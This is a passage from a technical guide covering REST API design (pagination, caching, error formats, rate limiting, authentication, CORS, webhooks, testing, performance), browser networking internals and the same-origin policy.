Theoretically most RESTful—different versions are different representations. However, complex for clients. Not widely adopted. Vendor-specific media types (`vnd.`) add overhead.

**No Versioning (Evolution)** Additive changes maintain backward compatibility. New fields are optional. Deprecated fields remain functional. Clients ignore unknown fields. This approach avoids versioning complexity but constrains evolution. Breaking changes eventually require versioning.

**Deprecation Process** APIs evolve continuously. Mark deprecated features with warnings in documentation and response headers. Provide migration paths. Set sunset dates using the Sunset header (RFC 8594). Monitor usage before removing deprecated versions.

### Filtering, Sorting, and Pagination

**Filtering** Query parameters filter collection results:

```
/users?status=active&role=admin
/products?category=electronics&price_min=100&price_max=500
```

Support common operators through parameter naming conventions:

- Exact match: `field=value`
- Comparison: `field_gt=value`, `field_gte=value`, `field_lt=value`, `field_lte=value`
- Pattern matching: `field_like=pattern`
- Inclusion: `field_in=value1,value2,value3`
- Exclusion: `field_not=value`

Complex filters may use structured formats like RSQL or FIQL, though these sacrifice simplicity.

**Sorting** Sort parameter specifies ordering:

```
/users?sort=created_at
/users?sort=-created_at          # descending
/users?sort=last_name,first_name  # multiple fields
```

Prefix conventions indicate direction: `-` for descending, `+` or no prefix for ascending.

**Pagination** Pagination prevents overwhelming clients with large collections and reduces server load.

**Offset-based Pagination** Uses `offset` and `limit` parameters:

```
/users?offset=0&limit=20   # first page
/users?offset=20&limit=20  # second page
```

Or page-based:

```
/users?page=1&per_page=20
/users?page=2&per_page=20
```

Offset pagination is simple and allows jumping to arbitrary pages. However, it performs poorly with large offsets (database must skip rows). Results become inconsistent if data changes between requests (items appear twice or are skipped).

**Cursor-based Pagination** Uses opaque cursor pointing to positions in the result set:

```
/users?cursor=eyJpZCI6MTIzfQ&limit=20
```

Responses include next/previous cursors:

```json
{
  "data": [...],
  "pagination": {
    "next_cursor": "eyJpZCI6MTQzfQ",
    "prev_cursor": "eyJpZCI6MTAzfQ"
  }
}
```

Cursor pagination handles data changes gracefully. Performance remains consistent regardless of position. However, clients cannot jump to arbitrary pages. Cursors are typically encoded (Base64) and include sorting information.

**Link Header Pagination** RFC 8288 defines Link headers for pagination:

```
Link: </users?cursor=next123>; rel="next",
      </users?cursor=prev456>; rel="prev",
      </users?cursor=first789>; rel="first",
      </users?cursor=last012>; rel="last"
```

This approach keeps pagination metadata separate from response body, supporting HATEOAS principles.

**Range Headers** HTTP Range headers enable pagination:

```
Range: items=0-19
```

Response includes Content-Range:

```
Content-Range: items 0-19/100
```

This method aligns with HTTP semantics but sees limited adoption for REST APIs.

### Idempotency and Safety

**Safe Methods** Safe methods don't modify resources. GET, HEAD, OPTIONS, and TRACE are safe. Clients can call safe methods without concern for side effects. Caches can store responses without coordination. Preloading and prefetching are acceptable.

[Inference] However, safe methods may trigger logging, analytics, or rate limiting—these implementation details don't violate safety since they don't alter resources from the client's perspective.

**Idempotent Methods** Idempotent methods produce the same result regardless of how many times they're called. GET, HEAD, OPTIONS, PUT, DELETE, and TRACE are idempotent. POST and PATCH are not inherently idempotent.

Idempotency enables safe retries. If a request times out, clients can retry without fear of unintended duplicates. Network intermediaries can replay requests for reliability.

**Idempotency for POST** POST creates resources, so repeating POST creates duplicates. Idempotency-Key headers (standardized in RFC draft) enable idempotent POST:

```
Idempotency-Key: 4e8f5931-3c5e-4a3d-9d4f-7c8b9e3f2a1b
```

Servers track these keys and return the original response for duplicate keys within a time window.

**Implementation Considerations** [Inference] Achieving true idempotency requires careful design. PUT must be a complete replacement—partial updates make idempotency complex. DELETE must handle already-deleted resources gracefully. Distributed systems face challenges—network partitions, concurrent requests, and race conditions can violate idempotency guarantees despite best efforts.

### Caching Mechanisms

**Cache-Control Directives** The Cache-Control header governs caching behavior:

- `public`: Any cache can store the response
- `private`: Only client caches, not shared caches
- `no-cache`: Must revalidate with server before using cached copy
- `no-store`: Don't store the response anywhere
- `max-age=seconds`: Response is fresh for specified duration
- `s-maxage=seconds`: Like max-age but only for shared caches
- `must-revalidate`: Stale responses must not be served without revalidation
- `proxy-revalidate`: Like must-revalidate but only for shared caches
- `immutable`: Response won't change during freshness lifetime

Example:

```
Cache-Control: public, max-age=3600, must-revalidate
```

**Expiration vs Validation** Expiration model uses max-age or Expires header—responses are fresh until expiration. Validation model uses ETags or Last-Modified—clients revalidate with conditional requests.

**ETags (Entity Tags)** ETags uniquely identify resource versions:

```
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
ETag: W/"weak-etag-value"
```

Strong ETags indicate byte-for-byte identity. Weak ETags (prefixed with `W/`) indicate semantic equivalence—content is equivalent but not byte-identical.

Clients include ETags in conditional requests:

```
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

If the resource hasn't changed, servers return 304 Not Modified with no body.

**Last-Modified/If-Modified-Since** Last-Modified timestamp enables time-based validation:

```
Last-Modified: Wed, 21 Oct 2023 07:28:00 GMT
```

Clients include timestamps in subsequent requests:

```
If-Modified-Since: Wed, 21 Oct 2023 07:28:00 GMT
```

304 Not Modified responses indicate no changes since the specified time.

**Conditional Requests for Concurrency Control** If-Match and If-Unmodified-Since headers enable optimistic locking. Clients include the ETag or timestamp they last retrieved. Servers process the request only if the condition matches, returning 412 Precondition Failed for conflicts.

This prevents lost updates when multiple clients modify the same resource concurrently.

**Vary Header** Vary specifies which request headers affect response content:

```
Vary: Accept-Encoding, Accept-Language
```

Caches must store separate entries for different values of these headers. Without Vary, caches might serve inappropriate representations.

**Cache Invalidation** Servers can't directly invalidate cached responses. TTL expiration and conditional revalidation eventually refresh caches. For time-sensitive data, use short max-age values or no-cache directives. Aggressive caching requires versioned URIs—changes get new URIs, automatically invalidating old versions.

### Error Handling and Problem Details

**Consistent Error Response Structure** Error responses should follow predictable formats. Include sufficient information for debugging without exposing sensitive details.

Basic structure:

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "The request contains invalid parameters",
    "details": [
      {
        "field": "email",
        "issue": "Invalid email format"
      }
    ]
  }
}
```

**RFC 7807 Problem Details** RFC 7807 standardizes error responses with the `application/problem+json` media type:

```json
{
  "type": "https://example.com/probs/validation-error",
  "title": "Validation Error",
  "status": 400,
  "detail": "The email field contains an invalid email address",
  "instance": "/users/123",
  "invalid-params": [
    {
      "name": "email",
      "reason": "must be a valid email address"
    }
  ]
}
```

Fields:

- `type`: URI identifying the problem type (dereferenceable for human-readable explanations)
- `title`: Short human-readable summary
- `status`: HTTP status code
- `detail`: Human-readable explanation specific to this occurrence
- `instance`: URI identifying the specific occurrence

Extension members (like `invalid-params`) provide additional context.

**Error Code Design** Machine-readable error codes enable programmatic handling. Use namespaced codes to avoid collisions:

```
AUTH_INVALID_TOKEN
AUTH_EXPIRED_TOKEN
VALIDATION_REQUIRED_FIELD
VALIDATION_INVALID_FORMAT
RESOURCE_NOT_FOUND
RESOURCE_CONFLICT
```

Error codes should be stable—clients depend on them for logic.

**Validation Errors** Validation errors require field-level detail. Return all validation errors simultaneously rather than forcing clients to fix issues one at a time:

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Request validation failed",
    "fields": {
      "email": ["Must be a valid email address"],
      "age": ["Must be at least 18"],
      "password": [
        "Must be at least 8 characters",
        "Must contain at least one number"
      ]
    }
  }
}
```

**Security Considerations** Balance helpful error messages with security. Don't expose:

- Internal implementation details (stack traces, database errors)
- Whether resources exist when authorization fails (prefer 404 over 403 for unauthorized access)
- Specific reasons for authentication failures (username vs password errors)
- System information (software versions, internal paths)

Generic messages for security-sensitive errors prevent information leakage. Log detailed errors server-side for debugging.

### Rate Limiting

**Rate Limit Headers** Communicate rate limits through response headers:

```
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 247
X-RateLimit-Reset: 1609459200
```

- `Limit`: Maximum requests in the time window
- `Remaining`: Requests remaining in current window
- `Reset`: Unix timestamp when the window resets

Alternative naming uses `X-Rate-Limit-*` or drops the `X-` prefix entirely. RFC draft proposes standardized `RateLimit-*` headers.

**429 Too Many Requests** When limits are exceeded, return 429 with Retry-After header:

```
HTTP/1.1 429 Too Many Requests
Retry-After: 3600
RateLimit-Limit: 1000
RateLimit-Remaining: 0
RateLimit-Reset: 1609459200
```

Retry-After specifies seconds to wait or an HTTP date.

**Rate Limiting Strategies** Fixed window counts requests within time periods (per minute, hour, day). Simple but allows bursts at window boundaries—users can make limit × 2 requests by clustering at the window edge.

Sliding window tracks request timestamps. More accurate but requires more storage and computation.

Token bucket algorithms allow bursts up to bucket capacity while enforcing average rate. Tokens regenerate continuously. Requests consume tokens. This approach smooths traffic while accommodating legitimate bursts.

Leaky bucket processes requests at fixed rate. Excess requests queue or are rejected. Enforces strict rate control.

**Granular Rate Limiting** Different limits for different contexts:

- Unauthenticated vs authenticated users
- Free vs paid tiers
- Specific endpoints (expensive operations have lower limits)
- Per-user vs per-IP vs per-API-key

Headers should reflect the applicable limit for the current request context.

**Rate Limit Scope** Specify what the limit applies to:

```
X-RateLimit-Scope: user
X-RateLimit-Scope: ip-address
X-RateLimit-Scope: api-key
```

This clarifies whether limits are shared across sessions or isolated per authentication token.

### Authentication and Authorization

**API Keys** Simple authentication tokens passed in headers or query parameters:

```
X-API-Key: a1b2c3d4e5f6
Authorization: ApiKey a1b2c3d4e5f6
```

API keys identify applications or users. Simple to implement and use. However, they're long-lived and typically have broad permissions. Compromised keys grant extensive access. Rotation is infrequent. Query parameter keys appear in logs and browser history.

**HTTP Basic Authentication** Sends credentials encoded in Base64:

```
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

Simple and widely supported. However, credentials are only obfuscated, not encrypted—requires HTTPS. Credentials pass with every request. No logout mechanism. Suitable for simple use cases or as a fallback.

**Bearer Tokens** Opaque tokens passed in Authorization header:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Tokens can be self-contained (JWT) or reference-based (requiring server-side lookup). Token-based auth separates authentication from authorization. Tokens can have limited scope and expiration. Revocation requires server-side tracking or short expiration times.

**OAuth 2.0** Authorization framework enabling third-party access without sharing credentials. Four grant types serve different scenarios:

Authorization Code Grant: Web applications redirect users to authorization server, receive authorization code, exchange code for tokens. Most secure for web apps.

Implicit Grant: Deprecated—tokens returned directly in redirect URI. Vulnerable to token leakage.

Client Credentials Grant: Machine-to-machine authentication. Application authenticates with client ID and secret, receives access token.

Resource Owner Password Credentials Grant: Discouraged—application collects user credentials directly. Only for highly trusted applications.

OAuth provides scopes limiting token permissions. Refresh tokens enable long-term access without storing passwords. However, OAuth adds implementation complexity and requires careful configuration to avoid security vulnerabilities.

**JWT (JSON Web Tokens)** Self-contained tokens encoding claims:

```
header.payload.signature
```

Header specifies algorithm and token type. Payload contains claims (user ID, roles, expiration). Signature verifies authenticity.

JWTs eliminate server-side session storage. Services can validate tokens independently. However, tokens can't be invalidated before expiration without additional infrastructure. Large payloads increase request size. Stored tokens remain valid even after password changes.

**OpenID Connect** Authentication layer built on OAuth 2.0. Provides identity tokens (ID tokens) separate from access tokens. Standardizes user info endpoints and discovery mechanisms. Enables single sign-on across applications.

**Security Best Practices** Always use HTTPS—TLS encrypts credentials and tokens in transit. Store sensitive tokens securely—avoid localStorage for XSS-vulnerable applications. Use HTTP-only cookies where appropriate. Implement token expiration and refresh mechanisms. Apply principle of least privilege—limit token scope to necessary permissions. Validate tokens thoroughly—check signatures, expiration, audience, issuer. Use CSRF tokens for cookie-based authentication. Monitor for suspicious activity and implement anomaly detection.

### CORS (Cross-Origin Resource Sharing)

**Same-Origin Policy** Browsers restrict cross-origin HTTP requests initiated by scripts. The same-origin policy prevents malicious sites from reading sensitive data from other origins. Origins differ if protocol, host, or port differ.

**CORS Headers** Servers explicitly allow cross-origin requests through response headers:

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

`Allow-Origin` specifies permitted origins. `*` allows any origin but prevents credentials. Specific origins enable credentialed requests.

`Allow-Methods` lists permitted HTTP methods.

`Allow-Headers` specifies headers clients can send.

`Allow-Credentials` enables cookies and authentication headers. Requires specific origin (not `*`).

`Max-Age` caches preflight responses for specified seconds.

**Preflight Requests** Complex requests trigger preflight OPTIONS requests:

```
OPTIONS /users HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

Browser sends preflight before actual request. Server responds with allowed methods and headers. If permitted, browser sends actual request.

Simple requests skip preflight:

- Methods: GET, HEAD, POST
- Headers: Accept, Accept-Language, Content-Language, Content-Type (limited values)
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

**Security Implications** Overly permissive CORS configurations create vulnerabilities. `Access-Control-Allow-Origin: *` with sensitive data exposes it to any site. Allowing credentials with broad origins enables CSRF attacks. Dynamic origins based on request headers require careful validation—don't blindly reflect Origin header.

Validate origins against allowlists. Use specific origins rather than wildcards when possible. Limit exposed headers through `Access-Control-Expose-Headers`. Implement additional security measures beyond CORS—CORS prevents browsers from reading responses, not from sending requests.

### Webhooks

**Push vs Pull** Traditional REST APIs use pull—clients poll for updates. Webhooks use push—servers send data to clients when events occur. Webhooks reduce latency and eliminate wasteful polling. However, they require publicly accessible client endpoints and introduce delivery reliability concerns.

**Webhook Registration** Clients register webhook URLs through API endpoints:

```
POST /webhooks
{
  "url": "https://client.example.com/webhooks/orders",
  "events": ["order.created", "order.completed"],
  "secret": "shared-secret-for-verification"
}
```

Servers validate webhook URLs before activation. Some require URL verification—sending a challenge to the URL and expecting specific response.

**Event Delivery** When events occur, servers POST event data to registered URLs:

```
POST /webhooks/orders
{
  "event": "order.created",
  "timestamp": "2024-12-16T10:30:00Z",
  "data": {
    "order_id": 12345,
    "amount": 99.99,
    "status": "pending"
  }
}
```

**Signature Verification** Webhook payloads should include signatures enabling clients to verify authenticity. Common approach uses HMAC:

```
X-Webhook-Signature: sha256=a3d8f7c9e2b1...
```

Compute HMAC using shared secret and payload. Compare with provided signature. This prevents spoofed webhooks and ensures message integrity.

**Delivery Guarantees** Webhooks face reliability challenges:

Network failures prevent delivery. Servers implement retry logic with exponential backoff. Track delivery attempts and eventual failures. Provide failure notifications or dashboards.

Duplicate delivery may occur due to retries. Clients should handle webhooks idempotently—use unique event IDs to detect duplicates.

Ordering isn't guaranteed across webhooks. Include timestamps and sequence numbers. Clients may need to handle out-of-order events.

**Response Expectations** Clients should respond quickly to webhook requests. HTTP 2xx status indicates successful receipt. Long processing should happen asynchronously—acknowledge receipt immediately, process later.

Timeouts trigger retries. Consistently slow or failing endpoints may be disabled automatically.

**Webhook Management** APIs should provide endpoints for:

- Listing registered webhooks
- Updating webhook configuration
- Deleting webhooks
- Viewing delivery history and logs
- Manually triggering test events
- Re-delivering failed events

### API Documentation

**OpenAPI Specification (formerly Swagger)** OpenAPI defines a standard, language-agnostic format for describing RESTful APIs. Machine-readable YAML or JSON documents enable code generation, testing, and interactive documentation.

Basic structure:

```yaml
openapi: 3.0.0
info:
  title: Users API
  version: 1.0.0
paths:
  /users:
    get:
      summary: List users
      parameters:
        - name: limit
          in: query
          schema:
            type: integer
      responses:
        '200':
          description: Successful response
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: '#/components/schemas/User'
components:
  schemas:
    User:
      type: object
      properties:
        id:
          type: integer
        name:
          type: string
```

OpenAPI documents describe endpoints, parameters, request bodies, responses, authentication, and data models. Tools generate interactive documentation (Swagger UI, ReDoc), client libraries, server stubs, and test cases.

**API Blueprint** Markdown-based format emphasizing human readability. Uses a structured markdown syntax for describing APIs. Less tooling support than OpenAPI but simpler for basic documentation.

**RAML (RESTful API Modeling Language)** YAML-based specification focusing on reusability through patterns and resource types. Modular design enables sharing common elements across endpoints.

**Documentation Best Practices** Provide examples for every endpoint—request examples with all parameters, response examples for success and error cases. Include authentication examples showing token usage.

Explain business logic and use cases, not just technical details. Describe what resources represent, when to use specific endpoints, and how endpoints relate.

Document side effects and constraints—rate limits, pagination details, filtering capabilities, sorting options. Specify required vs optional fields. Clarify validation rules.

Maintain accuracy—outdated documentation is worse than no documentation. Automate documentation generation from code when possible. Version documentation alongside API versions.

Include getting started guides, authentication walkthroughs, and common recipes. Provide SDKs or code examples in popular languages.

### Testing REST APIs

**Manual Testing Tools** Postman, Insomnia, and HTTP clients enable interactive API testing. Save requests in collections. Environment variables manage different configurations (dev, staging, production). Pre-request scripts and tests automate validation.

cURL provides command-line access:

```bash
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token" \
  -d '{"name":"John Doe"}'
```

**Contract Testing** Contract tests verify APIs match specifications. Pact and Spring Cloud Contract enable consumer-driven contract testing. Consumers define expected interactions. Providers verify they fulfill contracts. This prevents breaking changes and enables independent deployment.

**Integration Testing** Integration tests exercise complete request-response cycles. Tools like REST Assured (Java), SuperTest (Node.js), and requests (Python) facilitate integration testing.

Test multiple scenarios:

- Happy path with valid data
- Validation errors with invalid data
- Authentication failures
- Authorization failures
- Resource not found
- Concurrent modifications
- Rate limiting
- Large payloads

**Load Testing** Load testing tools (JMeter, Gatling, k6, Locust) simulate concurrent users. Measure throughput, latency, and error rates under load. Identify bottlenecks and capacity limits. Gradually increase load to find breaking points.

**Mock Servers** Mock servers simulate API responses during development. Prism, Mockoon, and WireMock generate mocks from OpenAPI specs. Enable frontend development before backend completion. Isolate components during testing.

**Security Testing** Security testing identifies vulnerabilities:

- SQL injection attempts
- XSS payloads
- Authentication bypass attempts
- Authorization boundary testing
- Rate limit verification
- CORS misconfiguration checks
- Input fuzzing

Tools like OWASP ZAP and Burp Suite automate security scanning.

### Performance Optimization

**N+1 Query Problem** Fetching a collection then iterating to fetch related resources creates N+1 queries. One query for the collection, N queries for related resources.

Solutions:

- Include related resources in the initial response (eager loading)
- Batch requests using specialized endpoints that accept multiple IDs
- Use GraphQL-style field selection to specify needed relationships
- Implement DataLoader pattern to batch and cache requests

**Response Compression** Enable gzip or brotli compression for responses. Reduces bandwidth and transfer time. Most clients support compression automatically. Configure servers to compress responses above size thresholds. Text-based formats (JSON, XML) compress significantly.

**Conditional Requests** ETags and Last-Modified headers enable conditional requests. 304 Not Modified responses eliminate unnecessary data transfer. Clients reuse cached data when nothing changed.

**Payload Size Optimization** Minimize response payloads:

- Return only requested fields (field filtering: `/users?fields=id,name,email`)
- Paginate large collections
- Compress verbose formats
- Consider binary formats for specific use cases (though JSON remains standard for REST)
- Remove unnecessary metadata
- Use shorter property names for high-volume endpoints (though this sacrifices readability)

**Database Query Optimization** Optimize database access:

- Index frequently queried fields
- Avoid SELECT * queries—fetch only needed columns
- Implement query result caching
- Use database connection pooling
- Optimize JOIN operations
- Monitor slow queries and optimize schemas

**CDN and Caching** Distribute static or semi-static responses through CDNs. Cache GET responses with appropriate Cache-Control headers. Implement application-level caching (Redis, Memcached) for expensive operations. Use HTTP caching headers effectively. Cache database query results and computed values.

**Asynchronous Processing** Expensive operations shouldn't block request-response cycles. Return 202 Accepted immediately. Process asynchronously. Provide status endpoints for polling. Use webhooks to notify completion. Message queues (RabbitMQ, Kafka) decouple request handling from processing.

**Connection Management** Use HTTP/1.1 persistent connections (keep-alive) to reuse TCP connections. HTTP/2 multiplexes requests over single connections. Configure appropriate timeouts. Implement connection pooling in clients.

**Server-Side Optimizations** Choose appropriate server architectures—asynchronous non-blocking servers (Node.js, Go) handle concurrent requests efficiently. Scale horizontally with load balancers. Implement request queuing and backpressure. Monitor resource utilization (CPU, memory, database connections).

---

## Browser Networking Basics

### Network Stack Architecture

The browser network stack operates as a multi-layered system that handles all HTTP/HTTPS communications. Modern browsers implement this stack with several key components: the network service (often running in a separate process for security), socket pools for connection management, disk cache for storing responses, and certificate verification systems.

The network service manages request prioritization, scheduling multiple concurrent requests while respecting connection limits. Browsers typically limit connections to 6-8 per domain (HTTP/1.1) but can handle many more with HTTP/2's multiplexing capabilities over a single connection.

### Connection Management

**Connection Pooling**

Browsers maintain pools of persistent TCP connections to reduce latency. When a request completes, the connection remains open for a timeout period (typically 60-120 seconds for keep-alive). Subsequent requests to the same origin reuse these connections, eliminating the TCP handshake and TLS negotiation overhead.

Connection pools are keyed by origin (scheme + host + port) and proxy configuration. HTTP/2 connections use a single multiplexed connection per origin, while HTTP/1.1 maintains multiple parallel connections.

**Connection Preconnection**

Browsers support several connection optimization hints:

- `dns-prefetch`: Resolves DNS early for cross-origin resources
- `preconnect`: Establishes full connection (DNS + TCP + TLS) before the resource is needed
- `prefetch`: Downloads resources for future navigation
- `preload`: High-priority fetch for current page resources

### DNS Resolution

The browser DNS resolver operates with multiple cache layers:

1. **Browser DNS cache**: In-memory cache with TTL from DNS records
2. **OS DNS cache**: System-level cache shared across applications
3. **Router cache**: Network-level caching
4. **ISP recursive resolvers**: External DNS servers

DNS resolution can significantly impact page load time. A cold DNS lookup might take 20-120ms, while cached lookups return instantly. Modern browsers implement DNS prefetching for links on the page, speculatively resolving domains the user might navigate to.

### HTTP Request Lifecycle

**Request Initiation**

When JavaScript calls `fetch()` or the browser parses an HTML resource reference, the request enters the network stack's scheduling queue. The scheduler assigns priority based on resource type:

- HTML documents: Highest
- CSS: Very High
- JavaScript: High/Medium (depending on async/defer)
- Images: Low/Medium
- XHR/Fetch: Varies by developer-set priority

**Request Headers**

The browser automatically appends headers:

- `User-Agent`: Browser identification
- `Accept`: MIME types the browser can handle
- `Accept-Encoding`: Supported compression (gzip, br, deflate)
- `Accept-Language`: Language preferences
- `Cookie`: Relevant cookies for the domain
- `Referer`: Previous page URL (with policy restrictions)
- `Origin`: For CORS requests
- `Connection`: Keep-alive behavior

### TLS/SSL Handshake

For HTTPS requests, the browser performs a TLS handshake:

1. **ClientHello**: Browser sends supported cipher suites, TLS versions, and extensions
2. **ServerHello**: Server selects cipher suite and provides certificate
3. **Certificate Verification**: Browser validates certificate chain against root CAs, checks revocation status (OCSP/CRLSets), and verifies domain name
4. **Key Exchange**: Establishes session keys using chosen algorithm (RSA, ECDHE, etc.)
5. **Finished**: Both parties confirm handshake completion

Modern browsers support TLS 1.2 and 1.3. TLS 1.3 reduces handshake to 1-RTT (round-trip time) compared to 2-RTT for TLS 1.2, and enables 0-RTT for resumed sessions.

### HTTP Protocol Versions

**HTTP/1.1**

The traditional protocol uses text-based headers and establishes multiple parallel connections. Key limitations include head-of-line blocking (requests must complete in order on each connection) and header verbosity on every request.

**HTTP/2**

Introduces binary framing, header compression (HPACK), and multiplexing. A single TCP connection carries multiple bidirectional streams. Benefits:

- Stream prioritization and dependencies
- Server push (server proactively sends resources)
- Reduced overhead from compressed headers
- No head-of-line blocking at HTTP layer

**HTTP/3 (QUIC)**

Runs over UDP instead of TCP, eliminating TCP's head-of-line blocking entirely. Each stream is independent at the transport layer. QUIC includes:

- Built-in TLS 1.3 (no separate handshake)
- Connection migration (survives IP address changes)
- Improved congestion control
- 0-RTT connection establishment for repeated visits

### CORS (Cross-Origin Resource Sharing)

Browsers enforce the same-origin policy, blocking cross-origin requests by default. CORS provides a controlled relaxation through HTTP headers.

**Simple Requests** (GET, HEAD, POST with limited content types) proceed directly, with the browser checking response headers:

- `Access-Control-Allow-Origin`: Permitted origins
- `Access-Control-Allow-Credentials`: Cookie inclusion

**Preflight Requests** (other methods, custom headers) trigger an OPTIONS request first:

```
OPTIONS /resource HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header
```

The server responds with allowed methods and headers. Only if approved does the actual request proceed.

### Caching

**HTTP Cache**

The browser cache stores responses based on cache headers:

- `Cache-Control`: Primary directive (max-age, no-cache, no-store, private, public)
- `Expires`: Absolute expiration time (legacy, superseded by Cache-Control)
- `ETag`: Resource version identifier for conditional requests
- `Last-Modified`: Timestamp for conditional requests

**Cache Revalidation**

When cached content might be stale, the browser sends conditional requests:

- `If-None-Match: [ETag]`: Checks if resource changed
- `If-Modified-Since: [date]`: Checks modification time

The server responds with `304 Not Modified` if unchanged, or `200 OK` with new content.

**Cache Storage**

Browsers implement multiple cache types:

- **HTTP cache**: Disk-based storage for HTTP responses
- **Service Worker cache**: Programmable cache API
- **Memory cache**: Fast in-memory cache for current page session
- **Push cache**: Temporary storage for HTTP/2 server push

### Cookies and State Management

**Cookie Transmission**

The browser automatically includes cookies matching the request domain and path. Cookie attributes control behavior:

- `Domain`: Scope to domain and subdomains
- `Path`: URL path restriction
- `Secure`: HTTPS-only transmission
- `HttpOnly`: Blocks JavaScript access
- `SameSite`: Controls cross-site sending (Strict/Lax/None)
- `Max-Age`/`Expires`: Lifetime control

**Cookie Limits**

Browsers enforce limits per domain (typically 50-180 cookies, 4KB per cookie). Exceeding limits causes oldest cookies to be evicted.

### Request Credentials

**Credential Modes**

The `credentials` option in Fetch API controls cookie/auth inclusion:

- `omit`: Never send credentials
- `same-origin`: Send for same-origin only (default)
- `include`: Send for cross-origin (requires CORS approval)

**Authentication**

Browsers handle HTTP authentication (Basic, Digest) automatically, prompting users for credentials and caching them for the session. Modern applications typically use token-based auth (Bearer tokens in Authorization header) instead.

### Network Security

**Mixed Content Blocking**

HTTPS pages cannot load "active" mixed content (scripts, stylesheets, iframes, XHR) over HTTP. The browser blocks these requests to prevent MITM attacks. Passive content (images, video, audio) may trigger warnings but often loads.

**Certificate Transparency**

Browsers require Certificate Transparency logs for newly issued certificates. Sites must provide Signed Certificate Timestamps (SCTs) proving certificate logging, or the browser rejects the connection.

**HSTS (HTTP Strict Transport Security)**

The `Strict-Transport-Security` header forces HTTPS for future visits. Once received, the browser upgrades all HTTP requests to HTTPS for the specified max-age duration. HSTS preload lists allow sites to enforce HTTPS even on first visit.

### Resource Timing API

Browsers expose detailed network timing through `performance.getEntriesByType('navigation')` and `performance.getEntriesByType('resource')`:

- `domainLookupStart/End`: DNS resolution time
- `connectStart/End`: TCP connection time
- `secureConnectionStart`: TLS handshake start
- `requestStart`: Request sent to server
- `responseStart`: First byte received (TTFB)
- `responseEnd`: Response fully received
- `transferSize`: Bytes transferred (including headers)
- `encodedBodySize`: Compressed response size
- `decodedBodySize`: Uncompressed response size

### Service Workers and Network Interception

Service workers act as programmable network proxies. The `fetch` event allows intercepting all network requests from the page:

```javascript
self.addEventListener('fetch', (event) => {
  event.respondWith(
    // Return cached response, network response, or synthetic response
  );
});
```

This enables offline functionality, custom caching strategies, and response manipulation. Service workers intercept requests before they reach the HTTP cache.

### Network Throttling and Adaptability

**Network Information API**

The `navigator.connection` API exposes network conditions:

- `effectiveType`: Estimated connection type (4g, 3g, 2g, slow-2g)
- `downlink`: Estimated bandwidth in Mbps
- `rtt`: Estimated round-trip time
- `saveData`: User's data saver preference

Applications can adapt resource loading based on these signals.

### Protocol Negotiation

**ALPN (Application-Layer Protocol Negotiation)**

During TLS handshake, the browser advertises supported HTTP versions (h2, http/1.1, h3). The server selects the protocol, determining whether the connection uses HTTP/1.1, HTTP/2, or HTTP/3.

**Alt-Svc Header**

Servers can advertise alternative services through the `Alt-Svc` header, informing browsers that HTTP/3 is available on a specific UDP port. The browser can then upgrade to HTTP/3 for subsequent requests.

### Request Prioritization

HTTP/2 and HTTP/3 support priority signals:

- **Weight**: Relative importance (1-256)
- **Dependencies**: Parent-child relationships between streams
- **Exclusive flag**: Takes all parent's resources

[Inference] Browsers use internal heuristics to assign priorities based on resource type, timing, and visibility. The exact algorithms vary by browser and version.

### Network Error Handling

The browser generates errors for various failure conditions:

- `net::ERR_NAME_NOT_RESOLVED`: DNS failure
- `net::ERR_CONNECTION_REFUSED`: Server not accepting connections
- `net::ERR_CONNECTION_TIMED_OUT`: Connection timeout
- `net::ERR_CERT_AUTHORITY_INVALID`: Certificate validation failed
- `net::ERR_CERT_DATE_INVALID`: Certificate expired or not yet valid
- `net::ERR_SSL_PROTOCOL_ERROR`: TLS handshake failure

Applications receive these as promise rejections (Fetch API) or error events (XHR), typically without detailed error information for security reasons.

### Proxy Configuration

Browsers support multiple proxy protocols:

- **HTTP proxy**: Routes HTTP requests through proxy server
- **HTTPS proxy**: Tunnels TLS connections via CONNECT method
- **SOCKS proxy**: Protocol-agnostic proxy at lower network layer
- **PAC (Proxy Auto-Config)**: JavaScript file determining proxy per URL

System-level proxy settings typically apply browser-wide, though some browsers allow per-profile configuration.

---

## Same-Origin Policy

### Core Mechanism

The same-origin policy restricts how documents or scripts loaded from one origin can interact with resources from another origin. Two URLs share the same origin when their protocol (scheme), host (domain), and port are identical.

**Origin comparison examples:**

- `https://example.com:443/page1` and `https://example.com:443/page2` → Same origin
- `https://example.com` and `http://example.com` → Different origins (protocol)
- `https://example.com` and `https://api.example.com` → Different origins (host)
- `https://example.com:443` and `https://example.com:8080` → Different origins (port)

### Scope of Restrictions

#### DOM Access

Scripts cannot access the DOM of documents from different origins. A page at `https://site-a.com` cannot read or manipulate the DOM of an iframe containing `https://site-b.com`.

**Exception:** If both documents set `document.domain` to the same value and share the same protocol and port, they can interact. This only works for subdomains of the same parent domain.

#### Cookie Access

JavaScript can only access cookies for its own origin. Cookies have their own scoping rules:

- `Domain` attribute allows sharing across subdomains
- `Path` attribute restricts cookie visibility within an origin
- `Secure` attribute limits cookies to HTTPS
- `SameSite` attribute controls cross-site cookie sending

#### Local Storage and Session Storage

`localStorage` and `sessionStorage` are strictly origin-scoped. No cross-origin access is possible.

#### IndexedDB

IndexedDB databases are origin-scoped with no cross-origin access mechanisms.

### Network Request Restrictions

#### XMLHttpRequest and Fetch API

By default, cross-origin requests are blocked unless the target server explicitly permits them via CORS headers. The browser performs:

**Simple requests:** Sent directly with an `Origin` header. Server responds with `Access-Control-Allow-Origin` to permit access.

**Preflight requests:** For non-simple requests (custom headers, methods like PUT/DELETE, certain content types), the browser sends an OPTIONS request first. The server must respond with appropriate CORS headers before the actual request proceeds.

#### Form Submissions

